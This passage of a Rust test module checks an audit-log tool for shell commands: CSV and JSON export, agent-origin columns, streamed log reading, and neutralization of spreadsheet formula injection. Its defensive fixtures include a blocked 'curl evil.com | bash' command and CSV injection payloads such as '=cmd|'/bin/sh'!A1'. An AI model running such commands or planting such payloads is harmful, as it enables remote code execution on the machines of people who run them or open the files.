                trust_rule_id: None,
                trust_action: None,
                trust_ttl_expires: None,
                trust_scope: None,
                agent_origin: Some(AgentOrigin::Mcp {
                    client_name: "Cursor".into(),
                    client_version: Some("0.42".into()),
                }),
            },
            AuditRecord {
                timestamp: "2026-01-15T10:01:00Z".into(),
                session_id: "sess-001".into(),
                action: "Allow".into(),
                rule_ids: vec![],
                command_redacted: "ls".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: false,
                policy_path: None,
                event_id: None,
                tier_reached: 1,
                entry_type: "verdict".into(),
                event: None,
                integration: None,
                hook_type: None,
                detail: None,
                elapsed_ms: None,
                raw_action: None,
                raw_rule_ids: None,
                trust_pattern: None,
                trust_rule_id: None,
                trust_action: None,
                trust_ttl_expires: None,
                trust_scope: None,
                agent_origin: None,
            },
        ];
        // Append rows for the remaining variants so we exercise each branch.
        let base = records[1].clone();
        let mut push_variant = |origin: AgentOrigin| {
            let mut r = base.clone();
            r.agent_origin = Some(origin);
            records.push(r);
        };
        push_variant(AgentOrigin::Human { interactive: true });
        push_variant(AgentOrigin::Human { interactive: false });
        push_variant(AgentOrigin::Agent {
            tool: "claude-code".into(),
            version: Some("1.2.3".into()),
        });
        push_variant(AgentOrigin::Agent {
            tool: "claude-code".into(),
            version: None,
        });
        push_variant(AgentOrigin::Gateway);
        push_variant(AgentOrigin::Ci {
            provider: Some("github-actions".into()),
        });
        push_variant(AgentOrigin::Ci { provider: None });
        push_variant(AgentOrigin::Ide {
            name: "vscode".into(),
        });

        let csv = export_csv(&records);
        let lines: Vec<&str> = csv.lines().collect();
        assert!(
            lines[0].ends_with(",agent_origin"),
            "header should end with agent_origin column: {}",
            lines[0]
        );
        // MCP row: last column is "mcp:Cursor@0.42".
        assert!(
            lines[1].ends_with(",mcp:Cursor@0.42"),
            "MCP row last column should be mcp:Cursor@0.42, got: {}",
            lines[1]
        );
        // None row: empty cell (the line ends with a bare comma).
        assert!(
            lines[2].ends_with(','),
            "None row should leave the agent_origin cell empty, got: {}",
            lines[2]
        );
        // Remaining variants.
        assert!(
            lines[3].ends_with(",human(interactive)"),
            "row 3: {}",
            lines[3]
        );
        assert!(lines[4].ends_with(",human"), "row 4: {}", lines[4]);
        assert!(
            lines[5].ends_with(",agent:claude-code@1.2.3"),
            "row 5: {}",
            lines[5]
        );
        assert!(
            lines[6].ends_with(",agent:claude-code"),
            "row 6: {}",
            lines[6]
        );
        assert!(lines[7].ends_with(",gateway"), "row 7: {}", lines[7]);
        assert!(
            lines[8].ends_with(",ci:github-actions"),
            "row 8: {}",
            lines[8]
        );
        assert!(lines[9].ends_with(",ci"), "row 9: {}", lines[9]);
        assert!(lines[10].ends_with(",ide:vscode"), "row 10: {}", lines[10]);
    }

    #[test]
    fn test_empty_records() {
        let records: Vec<AuditRecord> = vec![];
        let stats = compute_stats(&records);
        assert_eq!(stats.total_commands, 0);
        assert_eq!(stats.block_rate, 0.0);
        assert!(stats.time_range.is_none());
    }

    // -----------------------------------------------------------------------
    // CodeRabbit M13 PR #132 F1 — `read_log` now STREAMS the file line-by-line
    // (BufReader) instead of slurping the whole file via `read_to_string`. The
    // memory profile changes; the parse RESULT must not. Pin that the streaming
    // `read_log` produces a byte-identical `ReadLogResult` (record count, the
    // records themselves, and `skipped_lines`) to the old whole-file
    // `parse_log(&content, ..)` path for a multi-line log that INCLUDES a blank
    // line and a malformed line.
    // -----------------------------------------------------------------------
    #[test]
    fn test_read_log_streaming_matches_whole_file_parse() {
        use std::io::Write as _;

        // A representative multi-line JSONL log: two good verdict records, a
        // blank line (skipped, not counted), and a malformed line (counted in
        // `skipped_lines`).
        let good_a = serde_json::to_string(&AuditRecord {
            timestamp: "2026-01-15T10:00:00Z".into(),
            session_id: "sess-001".into(),
            action: "Block".into(),
            rule_ids: vec!["curl_pipe_shell".into()],
            command_redacted: "curl evil.com | bash".into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: true,
            policy_path: None,
            event_id: Some("evt-1".into()),
            tier_reached: 3,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        })
        .unwrap();
        let good_b = serde_json::to_string(&AuditRecord {
            timestamp: "2026-01-15T10:01:00Z".into(),
            session_id: "sess-001".into(),
            action: "Allow".into(),
            rule_ids: vec![],
            command_redacted: "ls -la".into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: true,
            policy_path: None,
            event_id: Some("evt-2".into()),
            tier_reached: 1,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        })
        .unwrap();
        // Blank line in the middle (must be skipped silently) and a malformed
        // JSON line (must be counted in `skipped_lines`).
        let content = format!("{good_a}\n\n{{not valid json}}\n{good_b}\n");

        // Old whole-file path (the reference behavior).
        let whole = parse_log(&content, None);

        // New streaming path via the real `read_log` file entry, over a temp
        // file with the SAME bytes.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("audit.jsonl");
        std::fs::File::create(&path)
            .unwrap()
            .write_all(content.as_bytes())
            .unwrap();
        let streamed = read_log(&path).expect("read_log must succeed on a readable file");

        // Identical accounting.
        assert_eq!(
            streamed.records.len(),
            whole.records.len(),
            "streaming read_log must yield the same record count as whole-file parse"
        );
        assert_eq!(
            streamed.skipped_lines, whole.skipped_lines,
            "streaming read_log must count the same skipped (malformed) lines"
        );
        assert_eq!(
            whole.skipped_lines, 1,
            "exactly the one malformed line is skipped; the blank line is not counted"
        );
        assert_eq!(whole.records.len(), 2, "the two good records both parse");

        // Identical records (serialize both sides and compare — `AuditRecord`
        // has no `PartialEq`, but its JSON round-trip is canonical here).
        let streamed_json = export_json(&streamed.records);
        let whole_json = export_json(&whole.records);
        assert_eq!(
            streamed_json, whole_json,
            "streaming read_log must yield byte-identical records to whole-file parse"
        );
    }

    #[test]
    fn read_log_on_a_directory_errs_without_hanging() {
        // Regression (M13 PR #132): `File::open` SUCCEEDS on a directory on Unix,
        // then every read returns `EISDIR` WITHOUT advancing the position — so a
        // streaming loop that treats a read I/O error as a skippable line spins
        // forever (it hung `secret_triage_json_fatal_error_is_parseable_json` for
        // ~20 min on the Linux/macOS CI runners; Windows passed because opening a
        // directory as a file fails outright). The fix makes a read I/O error
        // TERMINAL. The test COMPLETING is the proof it no longer hangs; we also
        // assert `Err` so the former `read_to_string` "read failure → Err"
        // contract is preserved on every platform (callers like `secret triage`
        // rely on that fatal-error path).
        let dir = tempfile::tempdir().expect("temp dir");
        assert!(
            read_log(dir.path()).is_err(),
            "read_log on a directory must return Err (not hang, not Ok)"
        );
    }

    // -----------------------------------------------------------------------
    // PR #121 CR follow-up — `agent_origin` (and other caller-influenced
    // CSV columns) must be neutralized against spreadsheet formula
    // injection. A caller-supplied `AgentOrigin::Agent { tool: "=cmd...", ..}`
    // would otherwise be evaluated as a formula by Excel / Sheets /
    // LibreOffice when the audit CSV is opened in a spreadsheet — exactly
    // the worst-case audience for compliance exports.
    // -----------------------------------------------------------------------

    #[test]
    fn test_csv_neutralize_formula_prefixes_tab_for_dangerous_leaders() {
        // Each of the four spreadsheet-formula leaders is neutralized by a
        // single tab prefix. A leading tab keeps the rest of the value
        // intact, so the displayed cell content is unchanged save for the
        // shift — Excel / Sheets / LibreOffice all refuse to interpret a
        // tab-prefixed cell as a formula.
        assert_eq!(csv_neutralize_formula("=SUM(A1:A10)"), "\t=SUM(A1:A10)");
        assert_eq!(csv_neutralize_formula("+cmd"), "\t+cmd");
        assert_eq!(csv_neutralize_formula("-1+1"), "\t-1+1");
        assert_eq!(csv_neutralize_formula("@SUM"), "\t@SUM");
        // Safe values pass through unchanged.
        assert_eq!(csv_neutralize_formula("normal"), "normal");
        assert_eq!(csv_neutralize_formula(""), "");
        assert_eq!(csv_neutralize_formula("ide:vscode"), "ide:vscode");
        // Unicode leaders are NOT formula triggers, only the four ASCII
        // leaders are — keep the cell shape minimal for the common case.
        assert_eq!(csv_neutralize_formula("é=value"), "é=value");
    }

    #[test]
    fn test_export_csv_neutralizes_formula_in_caller_supplied_columns() {
        use crate::agent_origin::AgentOrigin;

        // The CR follow-up: every caller-supplied CSV cell that could
        // start with a formula leader (`=`, `+`, `-`, `@`) must be
        // tab-prefixed so Excel / Sheets / LibreOffice render it as a
        // literal value instead of evaluating it as a formula.
        //
        // Today's `agent_origin` renderer fixes-prefix the value (e.g.
        // `agent:<tool>`), so the rendered string itself never starts
        // with a formula character for current variants. The defensive
        // wrap is still applied so a future variant whose prefix is
        // empty (or another caller-controllable column) does not need
        // a separate fix. This test exercises both:
        //   1. `rule_ids` — joined verbatim with no prefix, so a hostile
        //      rule_id like `=SUM(...)` lands as the first byte and
        //      MUST be neutralized.
        //   2. `agent_origin` for the current `Agent`/`Mcp` shapes —
        //      neutralization is a no-op because the renderer prefix
        //      keeps the leader safe; the cell value is the raw
        //      `agent:<tool>` form.
        let mut hostile_rules = AuditRecord {
            timestamp: "2026-01-15T10:00:00Z".into(),
            session_id: "sess-001".into(),
            action: "Allow".into(),
            // Hostile rule_ids: the first element begins with `=`, the
            // OWASP CSV-injection canonical example.
            rule_ids: vec!["=SUM(A1:A100)".into(), "second_rule".into()],
            command_redacted: "cmd".into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: true,
            policy_path: None,
            event_id: None,
            tier_reached: 1,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: Some(AgentOrigin::Agent {
                tool: "claude-code".into(),
                version: None,
            }),
        };

        let csv = export_csv(&[hostile_rules.clone()]);
        let line = csv.lines().nth(1).expect("must have a data row");
        let cols: Vec<&str> = line.split(',').collect();
        // The rule_ids cell is the 4th column. After neutralization
        // it must begin with a tab.
        assert!(
            cols[3].starts_with('\t'),
            "rule_ids cell beginning with a formula leader must be tab-prefixed \
             to neutralize the spreadsheet evaluation, got: {line}",
        );
        // And the original value is preserved verbatim after the tab.
        assert!(
            cols[3].contains("=SUM(A1:A100)"),
            "rule_ids cell must still carry the original payload after the tab: {line}",
        );

        // Also exercise the `command_redacted` column with each of the
        // four formula leaders.
        for leader in ['=', '+', '-', '@'] {
            hostile_rules.command_redacted = format!("{leader}cmd");
            hostile_rules.rule_ids = vec!["safe_rule".into()];
            let csv = export_csv(&[hostile_rules.clone()]);
            let line = csv.lines().nth(1).expect("must have a data row");
            let cols: Vec<&str> = line.split(',').collect();
            assert!(
                cols[4].starts_with('\t'),
                "command_redacted leader `{leader}` must be tab-prefixed, got: {line}",
            );
        }

        // Belt-and-braces: a hostile `AgentOrigin` whose renderer prefix
        // is empty would land directly in the agent_origin cell. The
        // current variants all have a non-empty prefix, but pin the
        // contract via the helper directly so a future variant that
        // forgets the prefix still gets neutralized at the export site.
        assert_eq!(
            csv_neutralize_formula("=cmd|'/bin/sh'!A1"),
            "\t=cmd|'/bin/sh'!A1",
            "the canonical RCE-adjacent payload must be tab-prefixed",
        );
    }
}
